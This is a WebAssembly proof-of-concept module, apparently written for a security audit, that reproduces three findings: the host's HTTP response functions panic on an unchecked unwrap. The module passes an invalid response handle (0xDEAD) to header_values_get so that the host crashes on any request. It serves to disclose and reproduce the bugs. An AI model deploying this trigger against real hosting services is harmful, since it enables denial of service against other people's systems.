;; PoC for findings 020, 021, 022: Invalid response handle panics
;;
;; 020: get_header_values calls response_parts(h).unwrap() (http_resp.rs:165)
;; 021: get_remote_ip_addr calls response_parts(h).unwrap() (http_resp.rs:321)
;; 022: get_remote_port calls response_parts(h).unwrap() (http_resp.rs:328)
;;
;; Using the wiggle ABI, we call header_values_get with an invalid response
;; handle. All three issues share the same root cause: unchecked unwrap on
;; response_parts() lookup.
;;
;; Trigger: serve this module and send any HTTP request.
;; Expected: host panic from unwrap on the invalid response handle.

(module
  (import "fastly_http_resp" "header_values_get"
    (func $resp_header_values_get
      (param i32 i32 i32 i32 i32 i32 i32 i32) (result i32)))

  (memory (export "memory") 1)

  ;; Header name at offset 0
  (data (i32.const 0) "content-type")

  (func (export "_start")
    ;; Read headers from a response handle that was never created
    (call $resp_header_values_get
      (i32.const 0xDEAD)  ;; invalid response handle
      (i32.const 0)       ;; name pointer
      (i32.const 12)      ;; name length ("content-type")
      (i32.const 100)     ;; output buffer
      (i32.const 1024)    ;; output buffer max len
      (i32.const 0)       ;; cursor
      (i32.const 200)     ;; ending_cursor_out
      (i32.const 300)     ;; nwritten_out
    )
    drop
  )
)
